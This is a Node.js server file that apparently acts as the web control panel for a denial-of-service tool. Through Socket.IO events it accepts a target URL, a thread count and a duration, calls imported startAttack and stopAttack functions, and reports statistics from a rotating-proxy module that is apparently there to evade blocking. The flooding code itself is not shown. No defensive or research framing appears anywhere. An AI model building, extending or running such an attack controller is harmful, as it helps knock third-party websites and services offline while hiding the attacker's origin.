const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { startAttack, stopAttack } = require('./assets/attack');
const proxyRotation = require('./assets/proxyrotation');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(express.static('public'));
app.use(express.json());

io.on('connection', (socket) => {
  console.log('Client connected');
  
  socket.on('get_proxy_stats', () => {
    socket.emit('proxy_stats', {
      active: proxyRotation.activeProxyCount(),
      total: proxyRotation.totalProxyCount()
    });
  });
  
  socket.on('start_attack', (data) => {
    startAttack(
      data.url,
      data.threads,
      data.duration,
      data.options,
      io
    );
    
    let remainingTime = data.duration;
    const timeInterval = setInterval(() => {
      if (remainingTime <= 0) {
        clearInterval(timeInterval);
        return;
      }
      remainingTime--;
      io.emit('time_update', remainingTime);
    }, 1000);
  });
  
  socket.on('stop_attack', () => {
    stopAttack(io);
  });
  
  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Access the tool at: http://localhost:${PORT}`);
});